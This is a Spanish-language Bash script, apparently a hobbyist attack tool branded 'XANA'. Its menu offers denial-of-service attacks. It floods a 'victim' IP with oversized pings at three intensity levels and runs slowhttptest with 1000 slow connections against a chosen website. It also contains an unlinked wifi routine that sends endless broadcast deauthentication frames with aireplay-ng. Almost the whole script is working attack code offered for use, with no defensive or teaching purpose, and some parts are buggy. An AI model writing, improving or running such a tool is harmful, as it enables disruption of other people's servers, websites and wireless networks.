#Color
redColour="\e[0;31m\033[1m"

function banner(){
   
echo -e  "\n$redColour
██╗  ██╗ █████╗ ███╗   ██╗ █████╗ 
╚██╗██╔╝██╔══██╗████╗  ██║██╔══██╗
 ╚███╔╝ ███████║██╔██╗ ██║███████║
 ██╔██╗ ██╔══██║██║╚██╗██║██╔══██║
██╔╝ ██╗██║  ██║██║ ╚████║██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝                                                                                   
"
}

function menu(){
    clear
    banner
    echo ""
    echo "1) DoS IP"
    echo ""
    echo "2) DDoS WEB"
    echo ""
    echo "3) DDoS Wifi"
    echo ""
    echo "4) Salir del Script"
    echo ""
    read -p ">>> " opt
    
    if [ $opt = 1 ]; then
    pingdelamuerte

    elif [ $opt = 2 ]; then
    slowhttptest-ataque

    elif [ $opt = 3 ]; then
    clear
    echo "Opcion no disponible"
    sleep 2
    menu

    fi
}

function pingdelamuerte(){
    clear
    banner
    sleep 1
    echo "Inserta IP de la Victima"
    echo ""
    read -p ">>> " ip
    sleep 1
    clear
    banner
    echo ""
    echo "Intensida del ataque"
    echo ""
    echo "1) Baja"
    echo ""
    echo "2) Media"
    echo ""
    echo "3) Alta"
    echo ""
    read -p ">>> " potencia 
    if [ $potencia = 1 ]; then
    clear
    banner 
    ping $ip -s 1040 -i 0.200
    menu
    elif [ $potencia = 2 ]; then
    clear
    banner
    ping $ip -s 2600 -i 0.200
    menu
    elif [ $potencia = 3 ]; then
    clear
    banner
    ping $ip -s 4046 -i 0.200
    menu
    fi
}

function slowhttptest-ataque(){
    clear
    banner
    echo ""
    sleep 1
    echo "Inserta URL de la WEB con HTTP/HTTPS"
    echo ""
    read -p ">>> " url
    clear
    banner
    slowhttptest -R -u $url -c 1000 -a 10 -b 3000 -r 500
    menu
}

function wifi(){
    clear
    banner
    echo ""
    echo "Seleciona tu Tarjeta de red"
    echo "---------------------------------"
    ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':'
    echo "---------------------------------"
    read -p ">>> " mono
    clear
    banner
    echo "Iniciando Modo Monitor"
    sleep 3
    clear
    sudo airmon-ng start $mono
    clear
    banner
    echo "Iniciando"
    sleep 1
    clear
    banner
    echo ""
    echo "Esto puede tardar unos minutos"
    sleep 1
    clear
    echo "Para Finalizar con el scan de Redes Pulse Ctrl + C" ; echo "" ;sleep 1; sudo wash --all -i wlx28ee521cbc16
    echo ""
    echo "Coloca BSSID/MAC"
    echo ""
    read -p ">>> " $mac
    sleep 1
    (sudo airodump-ng --bssid $mac $mono; bash)& sleep 20 ;(xterm -e "sudo aireplay-ng -0 0 -a $mac -c FF:FF:FF:FF:FF:FF $mono ")
    menu
}
menu
